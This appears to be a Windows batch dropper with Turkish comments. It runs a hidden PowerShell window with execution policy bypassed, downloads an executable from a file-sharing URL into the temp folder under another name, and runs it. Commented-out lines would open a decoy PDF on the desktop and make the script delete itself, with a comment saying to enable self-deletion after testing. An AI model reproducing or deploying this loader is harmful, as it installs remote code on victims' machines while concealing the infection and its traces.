@echo off

:: Sigortacılar için bu özelliği aç +1
:: set "DesktopFolder=%userprofile%\Desktop"
:: DownloadFile('URL'
:: GetTempPath(), 'FILENAME')) x2
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('https://filebin.net/pw27dn59l3qs0zxo/testapp.renamed.exe', [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'fes.exe')); Start-Process -FilePath ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'fes.exe')) -Wait"

::powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('https://pdfindirme.link/pdf.pdf', '%DesktopFolder%\pdfismi.pdf')"

:: start "" "%DesktopFolder%\pdfismi.pdf"

:: Bu özelliği testten sonra açarsınız çünkü bat dosyasını siliyor bilginize
:: del "%~f0"

exit